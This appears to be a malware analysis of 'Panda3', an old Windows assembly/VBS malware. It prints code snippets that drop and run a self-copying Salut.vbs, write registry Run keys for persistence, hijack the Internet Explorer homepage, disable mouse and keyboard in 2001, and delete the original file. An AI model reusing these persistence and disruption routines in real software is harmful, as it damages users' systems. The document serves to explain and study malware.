
**Panda3 Malware**

### Introduction

Panda3 is an assembly-based Windows malware that creates and executes a Visual Basic Script (VBS) file named **Salut.vbs**. It also modifies system registry entries, changes the default Internet Explorer homepage, and, under specific conditions, disables input devices while executing a program.

### Code Breakdown

The malware performs the following steps:

#### 1. Creating the Malicious File

The malware creates a file named **Salut.vbs** at `C:\Salut.vbs` using Windows API calls:

-   `CreateFileA` to create the file
    
-   `WriteFile` to write malicious content
    
-   `CloseHandle` to close the file handle
    

**Code snippet:**

```assembly
FICHIER: push 00h
        push 80h
        push 02h
        push 00h
        push 01h
        push 40000000h
        push offset nom_fichier  ; Filename: C:\Salut.vbs
        call CreateFileA
        mov  [flz_handle],eax
        push 00000000h
        push offset octets
        push offset taille
        push offset DEBUTV
        push [flz_handle]
        call WriteFile
        push [flz_handle]
        call CloseHandle
```

#### 2. Content of Salut.vbs

The **Salut.vbs** script:

-   Copies itself to the Windows and System folders under new names (`WSock32.dll.vbs` and `PandaDwarf.txt.vbs`).
    
-   Modifies the Windows registry to change the Internet Explorer homepage.
    
-   Adds an autorun entry to execute `WSock32.dll.vbs` on startup.
    
-   Deletes itself from `C:\Salut.vbs` after execution.
    

**VBS Code snippet:**

```assembly
Sub DEBUT()
Set a = CreateObject("Scripting.FileSystemObject")
Set win = a.GetSpecialFolder(0)
Set sys = a.GetSpecialFolder(1)
Set c = a.GetFile(WScript.ScriptFullName)
c.Copy(win & "\WSock32.dll.vbs")
c.Copy(sys & "\PandaDwarf.txt.vbs")
INTERNET()
BUG2001()
Set T = a.deletefile("C:\Salut.vbs")
End Sub
```

#### 3. Registry Modifications

The malware modifies the registry in two ways:

1.  **Changes RegisteredOwner Information**
    
    -   It writes "PandaKiller" into the `RegisteredOwner` field in the Windows registry.
        
2.  **Modifies Internet Explorer Settings & Startup Programs**
    
    -   It changes the default homepage to `http://www.penthouse.com`.
        
    -   It adds `WSock32.dll.vbs` to autorun at startup.
        

**Registry modification code:**

```assembly
REGISTRE: push offset l
          push offset p
          push 0
          push 1F0000h + 1 + 2h
          push 0
          push 0
          push 0
          push offset CLE
          push 80000002h  ; HKEY_LOCAL_MACHINE
          call RegCreateKeyExA
          push 05h
          push offset DONNEE  ; "PandaKiller"
          push 01h
          push 0
          push offset NOM  ; "RegisteredOwner"
          push p
          call RegSetValueExA  ; Modifies registry
          push 0
          call RegCloseKey  ; Closes registry key
```

#### 4. Additional Malicious Actions in 2001

If the system's year is 2001, the malware:

-   Disables the keyboard and mouse using `rundll32`.
    
-   Launches `Winmine.exe` (Windows Minesweeper).
    

**VBS Code snippet:**

```vbscript
Sub BUG2001()
If Year(Now) = 2001 Then
   Dim P
   Set P = Wscript.CreateObject("WScript.Shell")
   P.RegWrite "HKLM\Software\Microsoft\Windows\CurrentVersion\Run\Stop1", "rundll32,mouse disable"
   P.RegWrite "HKLM\Software\Microsoft\Windows\CurrentVersion\Run\Stop2", "rundll32,keyboard disable"
   P.run ("C:\WINDOWS\Winmine.exe")
End If
End Sub
```

#### 5. User Interaction

The malware displays two message boxes to the user:

-   **First Message:** "Salut! Ca va?" (Hello! How are you?)
    
-   **Second Message:** "A file has been placed on your computer. It is named Salut.vbs and is located in C:. Open it quickly!"
    

**Code snippet:**

```assembly
MESSAGE: push 40h
         push offset TITRE
         push offset TEXTE
         push 0
         call MessageBoxA
         push 40h
         push offset TITRE2
         push offset TEXTE2
         push 0
         call MessageBoxA
```

### Malware Impact

1.  **Persistence & Execution:** The malware ensures it executes on every system startup.
    
2.  **Registry Tampering:** It modifies system registry settings, changing the registered owner and default homepage.
    
3.  **Data Duplication:** The malware replicates itself in critical system folders.
    
4.  **Self-Deletion:** It removes its original copy from `C:\Salut.vbs` to evade detection.
    
5.  **User Disruption:** If the year is 2001, it disables the keyboard and mouse while launching a game.
    

### Conclusion

Panda3 is a multi-stage malware designed to establish persistence, alter system settings, and disrupt user operations. While relatively simple by modern standards, it demonstrates early techniques used in malware propagation and registry abuse.
